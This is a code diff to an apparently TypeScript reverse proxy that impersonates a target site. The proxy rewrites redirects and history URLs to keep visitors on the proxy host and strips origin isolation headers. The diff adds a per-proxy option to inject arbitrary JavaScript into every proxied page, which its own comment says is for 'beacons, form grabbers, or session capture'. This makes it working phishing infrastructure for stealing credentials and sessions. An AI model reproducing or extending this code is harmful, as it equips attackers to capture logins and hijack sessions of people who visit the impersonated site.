@@ -373,6 +373,8 @@ type ProxyConfig = {
   targetUrl: string;
   enabled: boolean;
   interceptEnabled: boolean;
+  injectJs: string;
+  injectJsEnabled: boolean;
 };
 
 /** Look up a proxy from the DO by its numeric id (internal). */
@@ -514,13 +516,16 @@ function hopByHopFor(request: Request): Set<string> {
 /**
  * HTMLRewriter-based content rewriting for proxied HTML responses. Fixes
  * redirect Location headers to point back through the proxy, injects a
- * <base> tag so relative links resolve correctly, and strips origin
- * isolation headers that would break the proxied page.
+ * <base> tag so relative links resolve correctly, strips origin
+ * isolation headers that would break the proxied page, and optionally
+ * injects a per-proxy custom JavaScript snippet for beacons, form
+ * grabbers, or session capture.
  */
 function rewriteProxiedContent(
   response: Response,
   proxyHost: string,
   targetHost: string,
+  injectJs?: string,
 ): Response {
   // Rewrite 3xx Location headers that point to the origin so they point
   // back through the proxy instead.
@@ -550,10 +555,17 @@ function rewriteProxiedContent(
 <script>window.__gwHost="${proxyHost}";window.__gwTarget="${targetHost}";
 (function(){var _wr=history.replaceState,_ps=history.pushState;history.replaceState=function(s,t,u){try{var n=new URL(u||"",location.href);if(n.host==="${targetHost}"){n.host="${proxyHost}";u=n.toString()}}catch(e){}return _wr.call(this,s,t,u)};history.pushState=function(s,t,u){try{var n=new URL(u||"",location.href);if(n.host==="${targetHost}"){n.host="${proxyHost}";u=n.toString()}}catch(e){}return _ps.call(this,s,t,u)}})();</script>`;
 
+  // Per-proxy custom JS injection — appended after the base rewrite script.
+  const customInjection = injectJs
+    ? `<script>${injectJs}</script>`
+    : "";
+
+  const fullInjection = baseInjection + customInjection;
+
   return new HTMLRewriter()
     .on("head", {
       element(el) {
-        el.prepend(baseInjection, { html: true });
+        el.prepend(fullInjection, { html: true });
       },
     })
     .transform(
@@ -888,6 +900,7 @@ async function reverseProxy(
             finalResponse,
             config.proxyDomain,
             target.host,
+            config.injectJsEnabled && config.injectJs ? config.injectJs : undefined,
           );
         } catch {
           // HTMLRewriter failed — return the unrewritten response.
